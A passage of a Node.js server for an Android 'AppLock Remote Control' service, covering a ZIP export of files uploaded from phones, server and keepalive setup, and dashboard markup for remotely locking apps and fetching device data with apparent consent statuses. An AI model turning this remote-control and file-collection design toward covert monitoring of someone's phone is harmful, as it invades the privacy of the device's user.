    return t;
  })();

  function crc32(buf) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < buf.length; i++) crc = crc32Table[(crc ^ buf[i]) & 0xFF] ^ (crc >>> 8);
    return (crc ^ 0xFFFFFFFF) >>> 0;
  }

  function dosDateTime(d) {
    d = d || new Date();
    const time = ((d.getHours() << 11) | (d.getMinutes() << 5) | (d.getSeconds() >> 1)) & 0xFFFF;
    const date = (((d.getFullYear() - 1980) << 9) | ((d.getMonth() + 1) << 5) | d.getDate()) & 0xFFFF;
    return { time, date };
  }

  function u16(val) { const b = Buffer.alloc(2); b.writeUInt16LE(val >>> 0, 0); return b; }
  function u32(val) { const b = Buffer.alloc(4); b.writeUInt32LE(val >>> 0, 0); return b; }

  // ── Bước 1: Đọc tất cả files vào memory trước khi stream ────────────────
  // Tránh tình trạng headers đã gửi nhưng body bị lỗi
  const entries = [];
  for (const rec of records) {
    if (!rec.relativePath) continue;
    const absPath = path.join(STORAGE_ROOT, rec.relativePath);
    if (!absPath.startsWith(STORAGE_ROOT + path.sep) && absPath !== STORAGE_ROOT) continue;
    if (!fs.existsSync(absPath)) continue;

    let fileData;
    try { fileData = fs.readFileSync(absPath); }
    catch (e) { console.warn('[ZIP] Skip unreadable file:', absPath, e.message); continue; }

    const deviceLabel = (rec.deviceName || rec.deviceId || 'device')
      .replace(/[^\w\-. ]/g, '_').slice(0, 40);
    const catLabel = (rec.category || 'file').replace(/[^\w]/g, '_').slice(0, 20);
    const nameLabel = (rec.originalName || rec.storedName || 'file')
      .replace(/[\x00-\x1f\\:*?"<>|]/g, '_').slice(0, 200);
    const entryName = deviceLabel + '/' + catLabel + '/' + nameLabel;
    const nameBytes = Buffer.from(entryName, 'utf8');
    const fileCrc   = crc32(fileData);
    const dt        = dosDateTime(rec.uploadedAt ? new Date(rec.uploadedAt) : null);

    entries.push({ nameBytes, fileData, crc: fileCrc, size: fileData.length, dt });
  }

  if (entries.length === 0) {
    return send(res, 404, { error: 'Không có file hợp lệ nào để đóng gói' });
  }

  // ── Bước 2: Tính toán toàn bộ ZIP buffer ────────────────────────────────
  const localParts  = [];
  const cdParts     = [];
  const offsets     = [];
  let   offset      = 0;

  for (const e of entries) {
    const localHdr = Buffer.concat([
      Buffer.from([0x50,0x4B,0x03,0x04]),
      u16(20), u16(0x0800), u16(0),
      u16(e.dt.time), u16(e.dt.date),
      u32(e.crc), u32(e.size), u32(e.size),
      u16(e.nameBytes.length), u16(0),
      e.nameBytes,
    ]);
    offsets.push(offset);
    localParts.push(localHdr, e.fileData);
    offset += localHdr.length + e.size;
  }

  const cdStart = offset;
  for (let i = 0; i < entries.length; i++) {
    const e = entries[i];
    const cdEntry = Buffer.concat([
      Buffer.from([0x50,0x4B,0x01,0x02]),
      u16(20), u16(20), u16(0x0800), u16(0),
      u16(e.dt.time), u16(e.dt.date),
      u32(e.crc), u32(e.size), u32(e.size),
      u16(e.nameBytes.length), u16(0), u16(0), u16(0), u16(0),
      u32(0), u32(offsets[i]),
      e.nameBytes,
    ]);
    cdParts.push(cdEntry);
    offset += cdEntry.length;
  }

  const cdSize  = offset - cdStart;
  const comment = Buffer.from('AppLock Data Export', 'utf8');
  const eocd    = Buffer.concat([
    Buffer.from([0x50,0x4B,0x05,0x06]),
    u16(0), u16(0),
    u16(entries.length), u16(entries.length),
    u32(cdSize), u32(cdStart),
    u16(comment.length),
    comment,
  ]);

  // ── Bước 3: Ghép thành một Buffer duy nhất ──────────────────────────────
  const zipBuffer = Buffer.concat([...localParts, ...cdParts, eocd]);

  const zipFilename = q.deviceId
    ? `device_data_${q.deviceId.slice(0, 8)}_${Date.now()}.zip`
    : `all_data_${Date.now()}.zip`;

  // ── Bước 4: Gửi với Content-Length chính xác ────────────────────────────
  res.writeHead(200, {
    'Content-Type':        'application/zip',
    'Content-Length':      zipBuffer.length,
    'Content-Disposition': `attachment; filename="${zipFilename}"`,
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Expose-Headers': 'Content-Disposition, Content-Length',
    'Cache-Control':       'no-cache',
  });
  res.end(zipBuffer);
  console.log(`[ZIP] Exported ${entries.length} file(s), ${zipBuffer.length} bytes → ${zipFilename}`);
});

// ─────────────────────────────────────────────────
// GET /api/ping — MUST be registered before server.listen
// Used by self-ping keepalive + external uptime monitors
// ─────────────────────────────────────────────────
route('GET', '/api/ping', (req, res) => {
  send(res, 200, { ok: true, time: new Date().toISOString(), uptime: Math.floor(process.uptime()) });
});

// ─────────────────────────────────────────────────
// HTTP Server
// ─────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;

const server = http.createServer(async (req, res) => {
  // Keep-alive header để tránh 502
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Keep-Alive', 'timeout=30');

  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin':  '*',
      'Access-Control-Allow-Methods': 'GET,POST,DELETE,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type,X-Device-Id,X-File-Category,X-File-Modified,X-Device-Name,X-Device-Model,X-Device-Brand',
      'Connection': 'keep-alive',
    });
    return res.end();
  }

  // Timeout per request (25s) để tránh treo
  const reqTimeout = setTimeout(() => {
    if (!res.headersSent) {
      send(res, 503, { error: 'Request timeout' });
    }
  }, 25000);

  const urlPath = req.url.split('?')[0];
  const matched = matchRoute(req.method, urlPath) || matchRoute(req.method, req.url);
  try {
    if (matched) {
      await matched.handler(req, res);
    } else {
      send(res, 404, { error: 'Not found' });
    }
  } catch (e) {
    console.error('[ERROR]', e.message);
    if (!res.headersSent) {
      send(res, 500, { error: 'Internal server error' });
    }
  } finally {
    clearTimeout(reqTimeout);
  }
});

// Keep-alive & timeout settings cho server
server.keepAliveTimeout = 30000;
server.headersTimeout   = 35000;
server.timeout          = 60000;

// Xử lý lỗi server không crash
server.on('error', (err) => {
  console.error('[SERVER ERROR]', err.message);
});

// ── Process handlers registered FIRST — before anything that can throw ──
process.on('uncaughtException', (err) => {
  console.error('[UNCAUGHT]', err.message, err.stack ? err.stack.split('\n')[1] : '');
  // Không exit — giữ server sống
});
process.on('unhandledRejection', (reason) => {
  console.error('[UNHANDLED REJECTION]', reason);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[SIGTERM] Shutting down gracefully...');
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 10000);
});
process.on('SIGINT', () => {
  console.log('[SIGINT] Shutting down...');
  server.close(() => process.exit(0));
});

// ── Ensure storage dirs exist after process handlers are wired ──
// This deferred check means fs errors go through uncaughtException instead of crashing cold
setImmediate(() => {
  const dirsToEnsure = [STORAGE_ROOT, DEVICES_PERSIST_DIR];
  for (const d of dirsToEnsure) {
    try {
      if (!fs.existsSync(d)) {
        fs.mkdirSync(d, { recursive: true });
        console.log('[INIT] Created directory:', d);
      }
    } catch (e) {
      console.error('[INIT] Cannot create directory (non-fatal):', d, e.message);
    }
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🔒 AppLock Remote Server running at http://0.0.0.0:${PORT}`);
  console.log(`   Dashboard         → http://localhost:${PORT}`);
  console.log(`   Backup Dashboard  → http://localhost:${PORT}/backup`);
  console.log(`   Android endpoint  → POST http://<YOUR_IP>:${PORT}/api/device/register`);
  console.log(`   Backup upload     → POST http://<YOUR_IP>:${PORT}/api/backup/upload\n`);
  // Defer self-ping until after the event loop has fully processed the listen callback
  // so all routes are guaranteed wired before the first ping fires
  setImmediate(() => startSelfPing());
});

server.on('error', (err) => {
  // EADDRINUSE means PORT is taken — fatal, must exit so Render can reassign
  if (err.code === 'EADDRINUSE') {
    console.error(`[FATAL] Port ${PORT} already in use. Exiting.`);
    process.exit(1);
  }
  console.error('[SERVER LISTEN ERROR]', err.message);
});

// ─────────────────────────────────────────────────
// Self-ping — giữ server sống 24/24 trên Render free
// Ping chính mình mỗi 5 phút để không bị spin down
// ─────────────────────────────────────────────────
function startSelfPing() {
  const PING_INTERVAL = 4 * 60 * 1000; // 4 phút (Render free spin-down sau 5 phút)

  const selfUrl = process.env.RENDER_EXTERNAL_URL
               || process.env.APP_URL
               || `http://localhost:${PORT}`;

  // Reuse the already-required https module; avoid re-requiring inside hot path
  const _https = require('https');
  const httpModule = selfUrl.startsWith('https') ? _https : http;

  function doPing() {
    const target = `${selfUrl}/api/ping`;
    let settled = false; // prevent double-retry if both error and timeout fire

    const req = httpModule.get(target, (res) => {
      console.log(`[PING] ${new Date().toISOString()} → ${target} (${res.statusCode})`);
      res.resume();
    });

    req.on('error', (err) => {
      if (settled) return;
      settled = true;
      console.warn(`[PING] Lỗi ping: ${err.message} — retry in 30s`);
      setTimeout(doPing, 30000);
    });

    req.setTimeout(12000, () => {
      if (settled) return;
      settled = true;
      req.destroy();
      console.warn('[PING] Timeout — retry in 30s');
      setTimeout(doPing, 30000);
    });
  }

  setInterval(doPing, PING_INTERVAL);
  // Ping lần đầu sau 15s — cho Render proxy thời gian warm up hoàn toàn
  setTimeout(doPing, 15000);

  console.log(`[PING] Self-ping mỗi 4 phút → ${selfUrl}/api/ping`);
}

// ─────────────────────────────────────────────────
// Dashboard HTML — all inline, zero dependencies
// ─────────────────────────────────────────────────
function getDashboardHTML() {
  return `<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>AppLock Dashboard</title>
<style>
  :root {
    --bg:        #0D1117;
    --surface:   #161B22;
    --card:      #1C2230;
    --card-lock: #1A2744;
    --accent:    #4F8EF7;
    --red:       #E53935;
    --green:     #43A047;
    --amber:     #FFAB40;
    --text:      #E6EDF3;
    --sub:       #8B949E;
    --divider:   #21262D;
    --online:    #26A641;
    --offline:   #484F58;
    --radius-sm: 8px;
    --radius-md: 14px;
    --radius-lg: 20px;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
    min-height: 100vh;
  }

  /* ── Header ── */
  header {
    background: linear-gradient(135deg, #1565C0 0%, #0D47A1 60%, #1A1F35 100%);
    padding: 24px 32px 20px;
    display: flex;
    align-items: center;
    gap: 16px;
    border-bottom: 1px solid #1e3a5f;
  }
  header .logo { font-size: 32px; }
  header h1 { font-size: 22px; font-weight: 700; letter-spacing: -0.3px; }
  header p  { font-size: 13px; color: rgba(255,255,255,.65); margin-top: 2px; }
  header .hdr-right { margin-left: auto; display: flex; gap: 12px; align-items: center; }
  .pill {
    background: rgba(255,255,255,.1);
    border: 1px solid rgba(255,255,255,.15);
    border-radius: 999px;
    padding: 5px 14px;
    font-size: 12px;
    font-weight: 600;
    color: #fff;
  }

  /* ── Layout ── */
  .layout {
    display: grid;
    grid-template-columns: 320px 1fr;
    height: calc(100vh - 84px);
  }

  /* ── Device sidebar ── */
  .sidebar {
    border-right: 1px solid var(--divider);
    background: var(--surface);
    overflow-y: auto;
    display: flex;
    flex-direction: column;
  }
  .sidebar-header {
    padding: 16px 20px 12px;
    border-bottom: 1px solid var(--divider);
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 1px;
    color: var(--sub);
    text-transform: uppercase;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .refresh-btn {
    background: none;
    border: 1px solid var(--divider);
    border-radius: 6px;
    color: var(--sub);
    padding: 3px 9px;
    font-size: 11px;
    cursor: pointer;
    transition: all .15s;
  }
  .refresh-btn:hover { border-color: var(--accent); color: var(--accent); }

  .device-card {
    padding: 14px 20px;
    border-bottom: 1px solid var(--divider);
    cursor: pointer;
    transition: background .12s;
    position: relative;
  }
  .device-card:hover  { background: rgba(79,142,247,.06); }
  .device-card.active { background: rgba(79,142,247,.12); border-left: 3px solid var(--accent); }

  .device-name {
    font-size: 14px;
    font-weight: 700;
    color: var(--text);
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .status-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .status-dot.online  { background: var(--online); box-shadow: 0 0 6px var(--online); }
  .status-dot.offline { background: var(--offline); }

  .device-meta {
    font-size: 11px;
    color: var(--sub);
    margin-top: 4px;
    line-height: 1.5;
  }
  .device-badges {
    display: flex;
    gap: 6px;
    margin-top: 8px;
    flex-wrap: wrap;
  }
  .badge {
    font-size: 10px;
    font-weight: 700;
    padding: 2px 8px;
    border-radius: 999px;
  }
  .badge-android { background: rgba(79,142,247,.15); color: var(--accent); border: 1px solid rgba(79,142,247,.3); }
  .badge-locked  { background: rgba(229,57,53,.15);  color: var(--red);    border: 1px solid rgba(229,57,53,.3);  }
  .badge-total   { background: rgba(139,148,158,.1);  color: var(--sub);   border: 1px solid var(--divider); }

  .empty-devices {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: var(--sub);
    font-size: 13px;
    gap: 12px;
    padding: 40px;
    text-align: center;
  }
  .empty-devices .icon { font-size: 48px; opacity: .4; }

  /* ── Main panel ── */
  .main {
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  /* ── App toolbar ── */
  .toolbar {
    padding: 16px 24px 12px;
    border-bottom: 1px solid var(--divider);
    display: flex;
    gap: 12px;
    align-items: center;
    flex-wrap: wrap;
    background: var(--surface);
  }
  .device-title { font-size: 18px; font-weight: 700; flex: 1; min-width: 200px; }
  .device-info-text { font-size: 12px; color: var(--sub); margin-top: 2px; }

  .search-box {
    background: var(--card);
    border: 1px solid var(--divider);
    border-radius: var(--radius-sm);
    color: var(--text);
    padding: 7px 12px;
    font-size: 13px;
    width: 200px;
    outline: none;
    transition: border-color .15s;
  }
  .search-box:focus { border-color: var(--accent); }

  .tab-bar {
    display: flex;
    gap: 4px;
    padding: 12px 24px 0;
    border-bottom: 1px solid var(--divider);
    background: var(--surface);
  }
  .tab {
    padding: 7px 16px;
    border-radius: var(--radius-sm) var(--radius-sm) 0 0;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    color: var(--sub);
    border: none;
    background: none;
    border-bottom: 2px solid transparent;
    transition: all .15s;
    margin-bottom: -1px;
  }
  .tab:hover  { color: var(--text); }
  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
  .tab-locked.active { color: var(--red) !important; border-bottom-color: var(--red) !important; }

  .stat-strip {
    padding: 8px 24px;
    font-size: 12px;
    color: var(--sub);
    background: var(--surface);
    border-bottom: 1px solid var(--divider);
    display: flex;
    gap: 20px;
  }
  .stat-strip span b { color: var(--text); }

  /* ── App list ── */
  .app-list {
    flex: 1;
    overflow-y: auto;
    padding: 8px 16px 24px;
  }

  .app-row {
    display: flex;
    align-items: center;
    gap: 14px;
    padding: 10px 14px;
    border-radius: var(--radius-md);
    margin-bottom: 6px;
    transition: background .12s;
    border: 1px solid transparent;
  }
  .app-row:hover { background: rgba(255,255,255,.03); }
  .app-row.locked-row {
    background: var(--card-lock);
    border-color: rgba(79,142,247,.12);
  }
  .app-row.locked-row:hover { background: #1e2e55; }

  .app-icon-wrap {
    width: 46px; height: 46px;
    border-radius: 12px;
    background: #1E2840;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0;
    font-size: 22px;
    overflow: hidden;
  }
  .app-icon-wrap img { width: 100%; height: 100%; object-fit: contain; border-radius: 10px; }

  .app-info { flex: 1; min-width: 0; }
  .app-name {
    font-size: 14px;
    font-weight: 600;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .app-pkg {
    font-size: 10px;
    color: var(--sub);
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-top: 2px;
  }
  .app-tags { display: flex; gap: 4px; margin-top: 4px; }
  .tag {
    font-size: 9px;
    font-weight: 700;
    padding: 1px 6px;
    border-radius: 4px;
    letter-spacing: .3px;
  }
  .tag-sys  { background: rgba(255,171,64,.12); color: var(--amber); }
  .tag-game { background: rgba(79,142,247,.12); color: var(--accent); }

  .app-right { display: flex; flex-direction: column; align-items: flex-end; gap: 6px; flex-shrink: 0; }
  .lock-status {
    font-size: 10px;
    font-weight: 700;
    padding: 2px 9px;
    border-radius: 999px;
  }
  .lock-status.locked  { background: rgba(229,57,53,.15);  color: var(--red);   }
  .lock-status.unlocked{ background: rgba(67,160,71,.15);  color: var(--green); }

  .action-btn {
    padding: 6px 16px;
    border-radius: 8px;
    font-size: 12px;
    font-weight: 700;
    border: none;
    cursor: pointer;
    transition: opacity .15s, transform .1s;
    min-width: 80px;
    text-align: center;
  }
  .action-btn:hover   { opacity: .85; transform: scale(.97); }
  .action-btn:active  { transform: scale(.94); }
  .action-btn.do-lock   { background: var(--red);   color: #fff; }
  .action-btn.do-unlock { background: var(--green); color: #fff; }
  .action-btn.pending   { background: var(--divider); color: var(--sub); cursor: wait; }

  /* ── No device selected ── */
  .no-device {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: var(--sub);
    gap: 16px;
  }
  .no-device .big-icon { font-size: 72px; opacity: .2; }
  .no-device h2 { font-size: 20px; font-weight: 700; color: var(--text); opacity: .4; }
  .no-device p  { font-size: 13px; max-width: 320px; text-align: center; line-height: 1.6; }

  /* ── Toast ── */
  #toast {
    position: fixed;
    bottom: 28px;
    right: 28px;
    background: var(--card);
    border: 1px solid var(--divider);
    border-radius: var(--radius-md);
    padding: 12px 20px;
    font-size: 13px;
    color: var(--text);
    box-shadow: 0 8px 32px rgba(0,0,0,.5);
    transform: translateY(80px);
    opacity: 0;
    transition: all .3s;
    z-index: 9999;
    max-width: 300px;
  }
  #toast.show { transform: translateY(0); opacity: 1; }
  #toast.toast-ok  { border-left: 3px solid var(--green); }
  #toast.toast-err { border-left: 3px solid var(--red); }

  /* ── Scrollbar ── */
  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--divider); border-radius: 3px; }
  ::-webkit-scrollbar-thumb:hover { background: #3b4250; }

  /* ── Password Modal ── */
  .modal-backdrop {
    position: fixed; inset: 0;
    background: rgba(0,0,0,.65);
    display: flex; align-items: center; justify-content: center;
    z-index: 10000;
    animation: fadeIn .15s ease;
  }
  @keyframes fadeIn { from { opacity:0 } to { opacity:1 } }
  .modal-box {
    background: var(--card);
    border: 1px solid rgba(79,142,247,.25);
    border-radius: var(--radius-lg);
    padding: 28px 28px 22px;
    width: 340px;
    max-width: 92vw;
    box-shadow: 0 20px 60px rgba(0,0,0,.6);
    animation: slideUp .18s ease;
  }
  @keyframes slideUp { from { transform:translateY(20px);opacity:0 } to { transform:translateY(0);opacity:1 } }
  .modal-icon-row {
    display: flex; align-items: center; gap: 12px;
    margin-bottom: 16px;
  }
  .modal-app-icon {
    width: 48px; height: 48px; border-radius: 12px;
    background: #1E2840;
    display:flex; align-items:center; justify-content:center;
    font-size: 22px; font-weight: 700; color: #fff; flex-shrink:0;
  }
  .modal-app-name { font-size: 16px; font-weight: 700; color: var(--text); }
  .modal-action-label { font-size: 12px; color: var(--red); font-weight: 600; margin-top: 2px; }
  .modal-label {
    font-size: 12px; color: var(--sub);
    margin-bottom: 8px; margin-top: 4px;
  }
  .modal-input {
    width: 100%;
    background: var(--surface);
    border: 1px solid var(--accent);
    border-radius: var(--radius-sm);
    color: var(--text);
    font-size: 18px;
    padding: 12px 14px;
    outline: none;
    text-align: center;
    letter-spacing: 4px;
    margin-bottom: 6px;
  }
  .modal-input:focus { border-color: #82b0ff; box-shadow: 0 0 0 3px rgba(79,142,247,.15); }
  .modal-err {
    font-size: 11px; color: var(--red);
    min-height: 16px; margin-bottom: 14px; text-align:center;
  }
  .modal-footer { display: flex; gap: 10px; justify-content: flex-end; margin-top: 4px; }
  .modal-btn {
    padding: 9px 22px; border-radius: var(--radius-sm);
    font-size: 13px; font-weight: 700; border: none; cursor: pointer;
    transition: opacity .15s;
  }
  .modal-btn:hover { opacity: .85; }
  .modal-btn.cancel { background: var(--surface); color: var(--sub); border: 1px solid var(--divider); }
  .modal-btn.confirm { background: var(--red); color: #fff; }

  /* ── Fetch-data tab & panel ── */
  .tab-fetch { }
  .tab-fetch.active { color: #7c3aed !important; border-bottom-color: #7c3aed !important; }

  .fetch-panel {
    flex: 1;
    overflow-y: auto;
    padding: 24px;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }

  .fetch-action-card {
    background: var(--card);
    border: 1px solid var(--divider);
    border-radius: var(--radius-md);
    padding: 22px 24px;
  }
  .fetch-action-card h3 {
    font-size: 15px;
    font-weight: 700;
    margin-bottom: 8px;
    color: var(--text);
  }
  .fetch-action-card p {
    font-size: 12px;
    color: var(--sub);
    line-height: 1.7;
    margin-bottom: 14px;
  }

  .btn-fetch-data {
    background: #7c3aed;
    color: #fff;
    border: none;
    border-radius: var(--radius-sm);
    padding: 10px 22px;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    transition: background .15s, opacity .15s, transform .1s;
  }
  .btn-fetch-data:hover:not(:disabled) { background: #5b21b6; }
  .btn-fetch-data:active:not(:disabled){ transform: scale(.97); }
  .btn-fetch-data:disabled { background: #374151; color: #9ca3af; cursor: default; }

  /* ── Download ZIP button ── */
  .btn-download-zip {
    background: linear-gradient(135deg, #059669 0%, #047857 100%);
    color: #fff;
    border: none;
    border-radius: var(--radius-sm);
    padding: 9px 18px;
    font-size: 13px;
    font-weight: 700;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    transition: opacity .15s, transform .1s, box-shadow .15s;
    box-shadow: 0 2px 8px rgba(5,150,105,.25);
    white-space: nowrap;
    flex-shrink: 0;
  }
  .btn-download-zip:hover:not(:disabled) {
    opacity: .9;
    box-shadow: 0 4px 14px rgba(5,150,105,.35);
    transform: translateY(-1px);
  }
  .btn-download-zip:active:not(:disabled) { transform: scale(.97); }
  .btn-download-zip:disabled { background: #374151; color: #9ca3af; cursor: default; box-shadow: none; }

  .fetch-status-msg {
    margin-top: 12px;
    font-size: 12px;
    color: #a78bfa;
    min-height: 18px;
  }

  .fetch-log-card {
    background: var(--card);
    border: 1px solid var(--divider);
    border-radius: var(--radius-md);
    padding: 18px 24px;
  }
  .fetch-log-card h3 {
    font-size: 14px;
    font-weight: 700;
    color: var(--text);
    margin-bottom: 12px;
  }
  .fetch-log-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 12px;
  }
  .fetch-log-table th {
    text-align: left;
    color: var(--sub);
    padding: 6px 10px;
    border-bottom: 1px solid var(--divider);
    font-weight: 600;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: .5px;
  }
  .fetch-log-table td {
    padding: 8px 10px;
    border-bottom: 1px solid rgba(255,255,255,.04);
    color: var(--text);
    vertical-align: middle;
  }
  .fetch-log-table tr:last-child td { border-bottom: none; }
  .fetch-log-status {
    font-size: 11px;
    font-weight: 700;
    padding: 2px 8px;
    border-radius: 999px;
  }
  .fetch-status-pending  { background: rgba(255,171,64,.15); color: var(--amber); }
  .fetch-status-sent     { background: rgba(79,142,247,.15); color: var(--accent); }
  .fetch-status-agreed   { background: rgba(67,160,71,.15);  color: var(--green); }
  .fetch-status-declined { background: rgba(229,57,53,.15);  color: var(--red); }

  .fetch-log-empty {
    text-align: center;
    color: var(--sub);
    padding: 32px 0;
    font-size: 13px;
  }

  /* ── Files đã upload trong tab Lấy dữ liệu ── */
  .fetch-files-card {
    background: var(--card);
    border: 1px solid var(--divider);
    border-radius: var(--radius-md);
    padding: 18px 24px;
  }
  .fetch-files-card h3 {
    font-size: 14px;
    font-weight: 700;
    color: var(--text);
    margin-bottom: 4px;
  }
  .fetch-files-summary {
    font-size: 11px;
    color: var(--sub);
    margin-bottom: 12px;
  }
  .fetch-files-filter {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
    margin-bottom: 12px;
  }
  .fetch-files-filter button {
    background: var(--hover);
    border: 1px solid var(--divider);
    color: var(--sub);
    border-radius: 999px;
    padding: 3px 12px;
    font-size: 11px;
    cursor: pointer;
    transition: all .15s;
  }
  .fetch-files-filter button.active {
    background: #7c3aed;
    color: #fff;
    border-color: #7c3aed;
  }
  .fetch-file-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(90px, 1fr));
    gap: 8px;
    max-height: 380px;
    overflow-y: auto;
  }
  .fetch-file-item {
    background: var(--hover);
    border: 1px solid var(--divider);
    border-radius: 8px;
    overflow: hidden;
    cursor: pointer;
    transition: border-color .15s;
    position: relative;
  }
  .fetch-file-item:hover { border-color: #7c3aed; }
  .fetch-file-item img {
    width: 100%;
    aspect-ratio: 1;
    object-fit: cover;
    display: block;
  }
  .fetch-file-item .file-icon {
    width: 100%;
    aspect-ratio: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 28px;
    background: #1a1f2e;
  }
  .fetch-file-item .file-name {
    font-size: 9px;
    color: var(--sub);
    padding: 4px 5px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .fetch-file-item .file-size {
    font-size: 9px;
    color: #6b7280;
    padding: 0 5px 4px;
  }
  .fetch-file-delete {
    position: absolute;
    top: 3px; right: 3px;
    background: rgba(0,0,0,.6);
    border: none;
    color: #ef4444;
    border-radius: 50%;
    width: 18px; height: 18px;
    font-size: 10px;
    cursor: pointer;
    display: none;
    align-items: center;
    justify-content: center;
    line-height: 1;
  }
  .fetch-file-item:hover .fetch-file-delete { display: flex; }
  .fetch-files-list {
    display: flex;
    flex-direction: column;
    gap: 4px;
    max-height: 380px;
    overflow-y: auto;
  }
  .fetch-file-row {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 6px 8px;
    background: var(--hover);
    border-radius: 6px;
    font-size: 12px;
    cursor: pointer;
    transition: background .15s;
  }
  .fetch-file-row:hover { background: #1e2a3a; }
  .fetch-file-row .row-icon { font-size: 16px; flex-shrink: 0; }
  .fetch-file-row .row-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text); }
  .fetch-file-row .row-size { color: var(--sub); font-size: 10px; flex-shrink: 0; }
  .fetch-file-row .row-del  { color: #ef4444; font-size: 11px; flex-shrink: 0; opacity: 0; transition: opacity .15s; cursor: pointer; }
  .fetch-file-row:hover .row-del { opacity: 1; }
  .fetch-view-more {
    text-align: center;
    padding: 10px 0 0;
    font-size: 12px;
    color: #7c3aed;
    cursor: pointer;
  }
  .fetch-view-more:hover { text-decoration: underline; }

  .btn-refresh-log {
    background: none;
    border: 1px solid var(--divider);
    border-radius: 6px;
    color: var(--sub);
    padding: 3px 9px;
    font-size: 11px;
    cursor: pointer;
    float: right;
    margin-top: -2px;
  }
  .btn-refresh-log:hover { border-color: var(--accent); color: var(--accent); }

  /* ── API hint ── */
  .api-hint {
    background: rgba(79,142,247,.06);
    border: 1px solid rgba(79,142,247,.15);
    border-radius: var(--radius-md);
    padding: 16px 20px;
    margin: 20px 24px;
    font-size: 12px;
    color: var(--sub);
    line-height: 1.7;
  }
  .api-hint b { color: var(--accent); font-family: monospace; font-size: 11px; }
  .api-hint h3 { color: var(--text); margin-bottom: 8px; font-size: 13px; }

  @media (max-width: 700px) {
    .layout { grid-template-columns: 1fr; }
    .sidebar { max-height: 40vh; }
  }
</style>
</head>
<body>

<header>
  <span class="logo">🔒</span>
  <div>
    <h1>AppLock Remote Control</h1>
    <p>Khóa &amp; mở khóa ứng dụng từ xa trên thiết bị Android</p>
  </div>
  <div class="hdr-right">
    <span class="pill" id="key-info-pill" title="Thông tin key đang dùng" style="cursor:default">🔑 Key</span>
    <span class="pill" id="device-count">0 thiết bị</span>
    <span class="pill" id="last-refresh">—</span>
    <button onclick="doLogout()" style="background:rgba(229,57,53,.15);border:1px solid rgba(229,57,53,.3);color:#ef9a9a;border-radius:999px;padding:5px 14px;font-size:12px;font-weight:600;cursor:pointer;transition:.15s" onmouseover="this.style.background='rgba(229,57,53,.3)'" onmouseout="this.style.background='rgba(229,57,53,.15)'">🚪 Đăng xuất</button>
  </div>
</header>

<div class="layout">
  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-header">
      Thiết bị
      <button class="refresh-btn" onclick="loadDevices()">↻ Làm mới</button>
    </div>
    <div id="device-list">
      <div class="empty-devices">
        <span class="icon">📱</span>
        <span>Chưa có thiết bị.<br/>Cài app trên điện thoại Android và đăng ký với server này.</span>
      </div>
    </div>
  </aside>

  <!-- Main panel -->
  <main class="main" id="main-panel">
    <div class="no-device">
      <span class="big-icon">🛡️</span>
      <h2>Chọn thiết bị</h2>
      <p>Chọn một thiết bị ở bên trái để xem và điều khiển danh sách ứng dụng của nó.</p>
    </div>
  </main>
</div>

<div id="toast"></div>
<div id="modal-root"></div>

<script>
  // ── Auth guard ─────────────────────────────────
  (async function checkAuth() {
    const token = localStorage.getItem('applock_token');
    if (!token) { window.location.href = '/'; return; }
    try {
      const r = await fetch('/api/auth/check-token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      });
      const d = await r.json();
      if (!d.ok) { localStorage.removeItem('applock_token'); window.location.href = '/'; }
    } catch (e) {
      // Network error — allow to continue (offline tolerance)
    }
    // Hiển thị thông tin key nếu có
    const keyType    = localStorage.getItem('applock_key_type') || '';
    const keyExpires = localStorage.getItem('applock_key_expires') || '';
    const pill = document.getElementById('key-info-pill');
    if (pill) {
      if (keyType === 'premium') {
        pill.textContent = '★ Premium';
        pill.style.background = 'rgba(173,127,30,.25)';
        pill.style.borderColor = 'rgba(173,127,30,.5)';
        pill.style.color = '#fcd34d';
      } else if (keyType) {
        pill.textContent = '🔑 ' + keyType;
      }
      if (keyExpires) {
        const exp = new Date(keyExpires);
        const now = new Date();
        const diffH = Math.round((exp - now) / 3600000);
        if (diffH > 0) {
